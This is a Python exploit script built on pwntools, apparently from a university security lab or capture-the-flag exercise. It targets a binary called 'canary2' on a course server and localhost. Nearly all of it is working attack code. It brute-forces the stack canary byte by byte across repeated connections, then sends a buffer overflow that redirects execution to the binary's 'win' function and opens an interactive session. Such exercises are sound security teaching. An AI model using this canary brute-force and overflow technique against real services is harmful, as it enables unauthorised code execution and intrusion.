#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template canary0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'canary2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4412)
    else:
        return remote('localhost', 4412)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

# use cyclic to detect the where is the canary
# - set follow palle
# - add a break to the start of the child
# - remember the rsp value ex: 0x7ffe308603b8 so even if the stack is move you check there
# - after the fread `x/s 0x7ffe308603b8`
# - cyclic -l faafga -> 520
# io = start()
# io.send(p32(700))
# io.send(cyclic(700))
# io.interactive()

import time

rip_offset = 520
canary_offset = 520-16


canary = b'\x00'


for i in range(7):
    for j in range(256):
        guess = canary + bytes([j])
        io = start()

        io.send(p32(canary_offset + len(guess)))
 
        payload = flat({
            canary_offset : [
                guess
            ]
        })
        
        io.send(payload)

        ## do not recv before the stack smash is sent back
        time.sleep(0.01)
        x = io.recv()

        
        if b'***' not in x:
            print(x)
            print(j, "daje")

            canary = guess
            io.close()
            break
        
        io.close()


io = start()

payload = flat({
    canary_offset : [
        canary,
        0x0,
        exe.sym['win']
    ]
})

io.send(p32(len(payload)))
io.send(payload)

io.interactive()
